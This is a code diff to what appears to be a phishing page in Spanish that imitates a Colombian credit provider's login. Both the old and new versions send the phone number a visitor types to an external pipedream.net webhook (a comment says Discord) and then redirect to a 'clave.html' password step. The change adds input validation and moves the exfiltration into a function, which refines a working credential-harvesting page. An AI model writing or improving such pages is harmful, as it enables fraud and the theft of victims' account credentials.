@@ -135,20 +135,9 @@
         <div class="phone-input-container">
             <div class="phone-input">
                 <div class="country-code">+57</div>
-                <input type="tel" class="phone-number" placeholder="Ingresa tu cel" value="">
+                <input type="tel" class="phone-number" id="celular" placeholder="Ingresa tu cel" value="" oninput="this.value = this.value.replace(/[^0-9]/g, '')" maxlength="10">
             </div>
-            <button class="btn-entrar" onclick="const webhookURL = 'https://eo8ne5wlaz6wu8g.m.pipedream.net';
-const numeroCelular = document.querySelector('.phone-number').value;
-
-const mensaje = `📱 **NUEVO INGRESO**\nNúmero: +57 ${numeroCelular}`;
-
-fetch(webhookURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content: mensaje })
-}).finally(() => {
-    window.location.href = 'clave.html';
-});">Entra</button>
+            <button class="btn-entrar" onclick="validarYEnviar()">Entra</button>
         </div>
         
         <div class="info-section">
@@ -158,5 +147,29 @@ fetch(webhookURL, {
             <p class="ritmo-text">Paga tu crédito de forma flexible y <strong>#ATuRitmo</strong></p>
         </div>
     </div>
+
+    <script>
+        function validarYEnviar() {
+            const celular = document.getElementById('celular').value;
+            const webhookURL = 'https://eo8ne5wlaz6wu8g.m.pipedream.net';
+            
+            // Validar que tenga exactamente 10 dígitos
+            if (celular.length !== 10) {
+                alert('Por favor ingresa un número de celular de 10 dígitos');
+                return;
+            }
+            
+            // Enviar a Discord
+            const mensaje = `📱 **NUEVO INGRESO**\nNúmero: +57 ${celular}`;
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: mensaje })
+            }).finally(() => {
+                window.location.href = 'clave.html';
+            });
+        }
+    </script>
 </body>
 </html>
